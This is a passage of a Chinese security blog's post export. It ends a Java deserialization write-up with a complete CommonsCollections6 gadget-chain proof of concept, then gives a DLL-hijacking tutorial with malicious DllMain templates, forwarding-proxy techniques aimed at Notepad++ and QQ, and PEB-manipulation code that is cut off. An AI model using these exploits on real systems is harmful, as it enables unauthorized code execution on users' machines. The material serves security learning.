</span><br><span class=\"line\">        <span class=\"comment\">//serialize(hashmap);</span></span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p>在序列化时没有问题，反序列化时没有弹出计算器，断点跟进，看到在LazyMap的 get 函数中 map 为 LazyMap, key为TiedMapEntry初始化传进的 <code>aaa</code>，逻辑也很简单，在一开始 hashMap 的 <strong>put</strong> 时候，如果没有key，进入if，调用完 transform 再 <strong>添加键key</strong>，这样在反序列化时，<strong>就不再进入if触发后续链子</strong>，所以这里要 <strong>把LazyMap的key给remove掉</strong>。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">lazymap.remove(<span class=\"string\">&quot;aaa&quot;</span>);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-sec/CommonsCollections/b6f94f6278c2407f9fe5f7470b0d2850.png\"></p>\n<h1 id=\"poc\"><a href=\"#poc\" class=\"headerlink\" title=\"poc\"></a>poc</h1><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">CC6</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        <span class=\"comment\">//Map lazymap = LazyMap.decorate(map, chainedTransformer);</span></span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazymap,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; hashmap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        hashmap.put(tiedMapEntry,<span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">        lazymap.remove(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = LazyMap.class;</span><br><span class=\"line\">        Field factory = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">        factory.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        factory.set(lazymap,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        serialize(hashmap);</span><br><span class=\"line\">        unserialize(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> IOException </span>&#123;</span><br><span class=\"line\">        FileOutputStream fos = <span class=\"keyword\">new</span> FileOutputStream(<span class=\"string\">&quot;ser.bin&quot;</span>);</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(fos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> Object <span class=\"title\">unserialize</span><span class=\"params\">(String Filname)</span> <span class=\"keyword\">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class=\"line\">        FileInputStream fis = <span class=\"keyword\">new</span> FileInputStream(Filname);</span><br><span class=\"line\">        ObjectInputStream ois = <span class=\"keyword\">new</span> ObjectInputStream(fis);</span><br><span class=\"line\">        Object obj = ois.readObject();</span><br><span class=\"line\">        <span class=\"keyword\">return</span> obj;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n","categories":["Java反序列化"]},{"title":"初探DLL劫持","url":"/2023/12/25/DLL%E5%8A%AB%E6%8C%81/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220824021558426.png\" alt=\"image-20220824021558426\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h1><p>浅学DLL相关</p>\n<h1 id=\"环境配置\"><a href=\"#环境配置\" class=\"headerlink\" title=\"环境配置\"></a>环境配置</h1><ul>\n<li>VS2022</li>\n<li><a href=\"https://blog.csdn.net/weixin_43997331/article/details/104764873\">cl.exe环境变量配置</a></li>\n</ul>\n<h1 id=\"什么是DLL\"><a href=\"#什么是DLL\" class=\"headerlink\" title=\"什么是DLL\"></a>什么是DLL</h1><p>DLL。在WIndows中DLL(Dynamic link library，动态链接库)是一个共享的库，其中包含可同时由多个程序使用的代码和数据，对常用函数和功能进行封装，这些DLL可实现不同的功能，每个DLL的功能实现可通过 <strong>导出函数来提供调用接口</strong>，在Windows的不同系统目录中存在大量的DLL文件，应用程序在实现时相应的功能时会调用这些DLL程序。</p>\n<p>动态库：在使用动态库时，往往提供两个文件：一个引入库（.lib，非必须）和一个.dll文件。.lib文件包含该动态库导出的函数和变量的符号名，而.dll文件包含该动态库实际的函数和数据。</p>\n<h1 id=\"DLL函数\"><a href=\"#DLL函数\" class=\"headerlink\" title=\"DLL函数\"></a>DLL函数</h1><p>在实现dll之前先搞懂几个预置的概念，dll文件所实现的功能是它的函数所提供的，分为两种：一、入口函数(DllMain)，二、导出函数。</p>\n<ul>\n<li>DllMain</li>\n</ul>\n<blockquote>\n<p>动态链接库的可选入口点 (DLL) 。 当系统启动或终止进程或线程时，它会使用进程的第一个线程调用每个已加载 DLL 的入口点函数。 当使用 LoadLibrary 和 FreeLibrary 函数加载或卸载 DLL 时，系统还会调用 DLL 的入口点函数。</p>\n</blockquote>\n<p>不是必须的函数，而且我们可以在不同的调用模式下写入我们自己的代码。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// dllmain.cpp : 定义 DLL 应用程序的入口点。</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&quot;pch.h&quot;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"function\">BOOL APIENTRY <span class=\"title\">DllMain</span><span class=\"params\">( HMODULE hModule, <span class=\"comment\">//  DLL模块的句柄</span></span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">                       DWORD  ul_reason_for_call, <span class=\"comment\">// 调用函数的原因</span></span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">                       LPVOID lpReserved  <span class=\"comment\">// 保留参数</span></span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"params\">                     )</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">switch</span> (ul_reason_for_call)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DLL_PROCESS_ATTACH:      <span class=\"comment\">// 进程加载DLL触发( LoadLibraryA)</span></span><br><span class=\"line\">        &#123;  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;DLL_PROCESS_ATTACH!\\n&quot;</span>);</span><br><span class=\"line\">        WinExec(<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"number\">0</span>); <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DLL_THREAD_ATTACH:       <span class=\"comment\">// 进程创建新线程加载触发(CreateThread)</span></span><br><span class=\"line\">        &#123;  <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DLL_THREAD_DETACH:       <span class=\"comment\">// 线程正常退出(CreateThread-Return)</span></span><br><span class=\"line\">        &#123;  <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">    <span class=\"keyword\">case</span> DLL_PROCESS_DETACH:      <span class=\"comment\">// 进程卸载DLL(函数：FreeLibrary、FreeLibraryAndExitThread)</span></span><br><span class=\"line\">        &#123; <span class=\"keyword\">break</span>; &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> TRUE;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>导出函数</li>\n</ul>\n<p>将我们写的函数导出的方式有两种：一、使用 __declspec(dllexport) ，二、使用模块定义（.def）文件。这里只记录一下第一种。</p>\n<p>mydll.c，在函数前加上关键字__declspec(dllexport)</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\">__declspec(dllexport) <span class=\"function\"><span class=\"keyword\">void</span> <span class=\"title\">calc</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">    system(<span class=\"string\">&quot;cmd /c calc&quot;</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>另外我们可以使用 <strong>dumpbin</strong> 命令查看dll文件的导出函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">dumpbin mydll.dll &#x2F;exports</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815161028072.png\" alt=\"image-20220815161028072\"></p>\n<p>针对于C++编译器，编译后的函数名为 fnDll2@xxxxx ，这是因为c++编译器基于函数重载的考虑，会更改函数名，为了避免这种现象，可以使用 <strong>extern “C”</strong> 指令来命令c++编译器以c编译器的方式来命名该函数</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">extern &quot;C&quot; __declspec(dllexport) void calc()&#123;</span><br><span class=\"line\">    system(&quot;cmd &#x2F;c calc&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815172231208.png\" alt=\"image-20220815172231208\"></p>\n<h1 id=\"DLL创建\"><a href=\"#DLL创建\" class=\"headerlink\" title=\"DLL创建\"></a>DLL创建</h1><h2 id=\"命令行\"><a href=\"#命令行\" class=\"headerlink\" title=\"命令行\"></a>命令行</h2><p>利用微软cl.exe，将mydll.c编译成dll文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cl mydll.c &#x2F;LD</span><br></pre></td></tr></table></figure>\n\n<p>多了lib文件和dll文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815161203906.png\" alt=\"image-20220815161203906\"></p>\n<h2 id=\"VS\"><a href=\"#VS\" class=\"headerlink\" title=\"VS\"></a>VS</h2><p>提供两种</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815162302951.png\" alt=\"image-20220815162302951\"></p>\n<p>选择具有导出项的动态链接库，编写恶意代码。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815163409170.png\" alt=\"image-20220815163409170\"></p>\n<h1 id=\"加载DLL\"><a href=\"#加载DLL\" class=\"headerlink\" title=\"加载DLL\"></a>加载DLL</h1><p>dll的加载有两种方式</p>\n<ul>\n<li>隐式调用（load-time dynamic linking）也叫静态链接</li>\n</ul>\n<p>使用 <strong>#include &lt;xxx.h&gt;**导入头文件和 **#pragma comment(lib, “xxx.lib”)</strong> 导入链接库文件</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &quot;testDLL.h&quot;</span><br><span class=\"line\">#pragma  comment(lib,&quot;testDLL.lib&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>右键解决方案，添加新建控制台应用，项目名称为Test，编写程序调用dll中的函数。ctrl+f5运行。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815173612769.png\" alt=\"image-20220815173612769\"></p>\n<p>如果调用的函数在恶意dll文件中不存在，程序会报出错误，并且也<strong>不会执行DllMain函数</strong></p>\n<ul>\n<li>显式调用（run-time dynamic linking）也叫动态链接</li>\n</ul>\n<p>通过 <strong>LoadLiabrary</strong> 函数显示加载dll。需要注意的是这时候我们不再需要注册.lib文件，也不需要声明外部函数。只要在需要使用的地方调用dll文件即可。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">typedef</span> <span class=\"title\">void</span><span class=\"params\">(*DLLFUNC)</span><span class=\"params\">(<span class=\"keyword\">void</span>)</span></span>;  <span class=\"comment\">//定义函数指针</span></span><br><span class=\"line\">    DLLFUNC func = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">    </span><br><span class=\"line\">    HINSTANCE DLL = LoadLibrary(<span class=\"string\">L&quot;Dll2.dll&quot;</span>);  <span class=\"comment\">//DLL句柄</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (DLL != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        func = (DLLFUNC)GetProcAddress(DLL, <span class=\"string\">&quot;?fnDll2@@YAHXZ&quot;</span>); <span class=\"comment\">//获取函数地址</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (func != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">            func();  <span class=\"comment\">//调用</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        FreeLibrary(DLL);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;test123&quot;</span>);  <span class=\"comment\">//卸载dll</span></span><br><span class=\"line\">    </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>有个注意的点，这里要使用被修饰的函数名</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815180738493.png\" alt=\"image-20220815180738493\"></p>\n<p>修改.h文件即可使用原函数名</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">extern &quot;C&quot; __declspec(dllexport) int fnDll2(void);</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220815180925346.png\" alt=\"image-20220815180925346\"></p>\n<p>即使调用了不存在的函数，不会报错，也 <strong>会执行DllMain函数</strong></p>\n<h1 id=\"DLL劫持\"><a href=\"#DLL劫持\" class=\"headerlink\" title=\"DLL劫持\"></a>DLL劫持</h1><p>如果在进程尝试加载一个DLL时没有并没有 <strong>指定DLL的绝对路径</strong>，那么Windows会尝试去按照顺序搜索这些特定目录来查找这个DLL,如果攻击者能够将恶意的DLL放在优先于正常DLL所在的目录，那么就能够欺骗系统去加载恶意的DLL。</p>\n<h1 id=\"DLL加载顺序\"><a href=\"#DLL加载顺序\" class=\"headerlink\" title=\"DLL加载顺序\"></a>DLL加载顺序</h1><p>在程序通过上述两种方式加载DLL时，都会进行DLL的搜索。会加载搜索过程中找到的第一个名称正确的DLL。系统搜索DLL之前，它会检查以下内容，如果已经存在了就不会搜索DLL：</p>\n<ul>\n<li><p>如果内存中已经加载了具有相同模块名称的 DLL</p>\n</li>\n<li><p>KnownDLLs注册表项（HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs）</p>\n</li>\n</ul>\n<p>上面都没有找到DLL的情况下，如果启用了 <strong>SafeDllSearchMode</strong>， 就按照如下搜索顺序搜索：</p>\n<ul>\n<li><p>应用程序加载目录(安装目录)</p>\n</li>\n<li><p>系统目录(C:\\Windows\\System32，使用 GetSystemDirectory 函数获取)</p>\n</li>\n<li><p>16 位系统目录(C:\\Windows\\System)</p>\n</li>\n<li><p>Windows 目录(C:\\Windows,使用 GetWindowsDirectory函数获取)</p>\n</li>\n<li><p>当前目录</p>\n</li>\n<li><p>PATH 环境变量中列出的目录</p>\n</li>\n</ul>\n<p>如果 <strong>SafeDllSearchMode</strong> 已禁用，则搜索顺序如下：</p>\n<ul>\n<li><p>应用程序加载目录(安装目录)</p>\n</li>\n<li><p>当前目录</p>\n</li>\n<li><p>系统目录(C:\\Windows\\System32，使用 GetSystemDirectory 函数获取)</p>\n</li>\n<li><p>16 位系统目录(C:\\Windows\\System)</p>\n</li>\n<li><p>Windows 目录(C:\\Windows,使用 GetWindowsDirectory函数获取)</p>\n</li>\n<li><p>PATH 环境变量中列出的目录</p>\n</li>\n</ul>\n<p>PS: Windows操作系统通过 <strong>DLL路径搜索目录顺序</strong> 和 <strong>Know DLLs注册表项</strong> 的机制来确定应用程序所要调用的DLL的路经，之后，应用程序就将DL_L载入了自己的内存空间，执行相应的函数功能。</p>\n<p>Know DLLs注册表项 <strong>指定的DLL</strong> 是已经被操作系统加载过后的DLL，不会被应用程序搜索并加载。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs</span><br></pre></td></tr></table></figure>\n\n<h1 id=\"DLL劫持发现\"><a href=\"#DLL劫持发现\" class=\"headerlink\" title=\"DLL劫持发现\"></a>DLL劫持发现</h1><h2 id=\"Process-Monitor\"><a href=\"#Process-Monitor\" class=\"headerlink\" title=\"Process Monitor\"></a>Process Monitor</h2><p>利用 Process Monitor 手动挖掘，设置为：</p>\n<p>允许这些</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Operation is CreateFile</span><br><span class=\"line\">Operation is Load Image</span><br><span class=\"line\">Path contains .cpl</span><br><span class=\"line\">Path contains .dll</span><br><span class=\"line\">Path contains .drv</span><br><span class=\"line\">Path contains .exe</span><br><span class=\"line\">Path contains .ocx</span><br><span class=\"line\">Path contains .scr</span><br><span class=\"line\">Path contains .sys</span><br></pre></td></tr></table></figure>\n\n<p>排除这些</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Process Name is procmon.exe</span><br><span class=\"line\">Process Name is Procmon64.exe</span><br><span class=\"line\">Process Name is System</span><br><span class=\"line\">Operation begins with IRP_MJ_</span><br><span class=\"line\">Operation begins with FASTIO_</span><br><span class=\"line\">Result is SUCCESS</span><br><span class=\"line\">Path ends with pagefile.sys</span><br></pre></td></tr></table></figure>\n\n<p>运行上面编译生成的exe，目录下没有dll文件单独执行，按照加载顺序进行加载dll文件，其次存在 <strong>LoadLibrary(Ex)</strong> 说明该dll文件是被进程动态加载，这样直接使用恶意dllmain函数的dll文件即可利用。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816011747152.png\" alt=\"image-20220816011747152\"></p>\n<p>这里拿notepad++6.6.6试试，发现直接就加载当前目录下的SciLexer.dll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816022407377.png\" alt=\"image-20220816022407377\"></p>\n<p>写一个dll，尝试在DllMain函数中弹个计算器，替换后执行exe</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816022657161.png\" alt=\"image-20220816022657161\"></p>\n<p>虽然成功加载Dllmain函数进行劫持，但是缺点也很明显，当调用后续函数时，报错没法执行，为了解决这种情况，下面要学一下DLL中的转发，悄无声息的执行我们的代码。</p>\n<h2 id=\"自动化工具\"><a href=\"#自动化工具\" class=\"headerlink\" title=\"自动化工具\"></a>自动化工具</h2><p>ImpulsiveDLLHijack、Rattler、Robber等</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816014408409.png\" alt=\"image-20220816014408409\"></p>\n<h2 id=\"其他方式\"><a href=\"#其他方式\" class=\"headerlink\" title=\"其他方式\"></a>其他方式</h2><p>发现个骚的手法，单独把exe拉出来运行，看报什么错</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816014644209.png\" alt=\"image-20220816014644209\"></p>\n<p>或者本目录下排除法删除dll文件，加载中的DLL因为句柄占用无法删除。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220816023026821.png\" alt=\"image-20220816023026821\"></p>\n<h1 id=\"DLL劫持利用\"><a href=\"#DLL劫持利用\" class=\"headerlink\" title=\"DLL劫持利用\"></a>DLL劫持利用</h1><h2 id=\"替换dll\"><a href=\"#替换dll\" class=\"headerlink\" title=\"替换dll\"></a>替换dll</h2><p>submitline，加载当前目录下的dbghelp.dll。写个同名恶意dll即可利用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220822144647915.png\" alt=\"image-20220822144647915\"></p>\n<h2 id=\"转发劫持\"><a href=\"#转发劫持\" class=\"headerlink\" title=\"转发劫持\"></a>转发劫持</h2><p>利用工具创建出具有转发功能的恶意dll，在程序调用某个函数时，先调用恶意dll，再转发调用原始dll中的函数，这里就分为两种，直接转发与即时调用，直接转发的利用方式只能在DllMain中利用，即时调用是在恶意dll中加载原始dll中某个函数的地址，然后进行调用，这样可以在恶意dll中创建同名函数，插入恶意代码，然后进行寻址调用，达到转发目的。</p>\n<p>这里利用工具：<a href=\"https://bbs.pediy.com/thread-224408.htm\">AheadLib修改 支持x64支持类/命名空间</a></p>\n<h3 id=\"直接转发\"><a href=\"#直接转发\" class=\"headerlink\" title=\"直接转发\"></a>直接转发</h3><p>以QQ为例子，对libuv.dll进行转发，AheadLib+生成一个cpp文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823004503216.png\" alt=\"image-20220823004503216\"></p>\n<p>vs 新建 DLL项目后，添加上代码，可以看到原dll文件有许多导出函数 ，通过这句话实现函数的转发</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#pragma comment(linker, &quot;&#x2F;EXPORT:Scintilla_DirectFunction&#x3D;SciLexerOrg.Scintilla_DirectFunction,@1&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>main函数加上代码，生成32位的dll</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823004354009.png\" alt=\"image-20220823004354009\"></p>\n<p>改变原dll文件名，Org为原始dll。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823004442303.png\" alt=\"image-20220823004442303\"></p>\n<p>双击qq弹出计算器</p>\n<p>这种方法会出现一种情况，虽然先调用了恶意dll后转发到原始dll，但是不清楚主程序的需求是什么可能是一个返回值，也可能参数不正确，这个时候都会导致主程序运行出错。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823005011353.png\" alt=\"image-20220823005011353\"></p>\n<h3 id=\"即时调用\"><a href=\"#即时调用\" class=\"headerlink\" title=\"即时调用\"></a>即时调用</h3><p>说白了就是在恶意dll文件中多加几行代码，LoadLibrary原始dll后通过GetAddress获取函数地址，然后跳到导出函数的地址，实现在恶意dll中进行调用原始函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010058231.png\" alt=\"image-20220823010058231\"></p>\n<p>main函数中调用load函数</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010341471.png\" alt=\"image-20220823010341471\"></p>\n<p>加载原始dll文件后调用 InitializeAddresses</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010409242.png\" alt=\"image-20220823010409242\"></p>\n<p>InitializeAddresses 获取原函数地址</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010504677.png\" alt=\"image-20220823010504677\"></p>\n<p>当通过调用函数时，进行转发到 _AheadLib_Scintilla_DirectFunction</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#pragma comment(linker, &quot;&#x2F;EXPORT:Scintilla_DirectFunction&#x3D;_AheadLib_Scintilla_DirectFunction,@1&quot;)</span><br></pre></td></tr></table></figure>\n\n<p>这个就是通过上面的原函数地址进行跳转调用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010612582.png\" alt=\"image-20220823010612582\"></p>\n<p>效果：payload执行并且不影响正常使用</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/DLL/image-20220823010231062.png\" alt=\"image-20220823010231062\"></p>\n<h2 id=\"一种更加通用的方式\"><a href=\"#一种更加通用的方式\" class=\"headerlink\" title=\"一种更加通用的方式\"></a>一种更加通用的方式</h2><p>参考文章：<a href=\"https://bbs.pediy.com/thread-248050-1.htm\">一种通用DLL劫持技术研究-编程技术-看雪论坛</a></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">void* NtCurrentPeb()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm &#123;</span><br><span class=\"line\">        mov eax, fs:[0x30];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">PEB_LDR_DATA* NtGetPebLdr(void* peb)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    __asm &#123;</span><br><span class=\"line\">        mov eax, peb;</span><br><span class=\"line\">        mov eax, [eax + 0xc];</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">VOID SuperDllHijack(LPCWSTR dllname, HMODULE hMod)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    WCHAR wszDllName[100] &#x3D; &#123; 0 &#125;;</span><br><span class=\"line\">    void* peb &#x3D; NtCurrentPeb();</span><br><span class=\"line\">    PEB_LDR_DATA* ldr &#x3D; NtGetPebLdr(peb);</span><br><span class=\"line\"> </span><br><span class=\"line\">    for (LIST_ENTRY* entry &#x3D; ldr-&gt;InLoadOrderModuleList.Blink;</span><br><span class=\"line\">        entry !&#x3D; (LIST_ENTRY*)(&amp;ldr-&gt;InLoadOrderModuleList);</span><br><span class=\"line\">        entry &#x3D; entry-&gt;Blink) &#123;</span><br><span class=\"line\">        PLDR_DATA_TABLE_ENTRY data &#x3D; (PLDR_DATA_TABLE_ENTRY)entry;</span><br><span class=\"line\"> </span><br><span class=\"line\">        memset(wszDllName, 0, 100 * 2);</span><br><span class=\"line\">        memcpy(wszDllName, data-&gt;BaseDllName.Buffer, data-&gt;BaseDllName.Length);</span><br><span class=\"line\"> </span><br><span class=\"line\">        if (!_wcsicmp(wszDllName, dllname)) &#123;</span><br><span class=\"line\">            data-&gt;DllBase &#x3D; 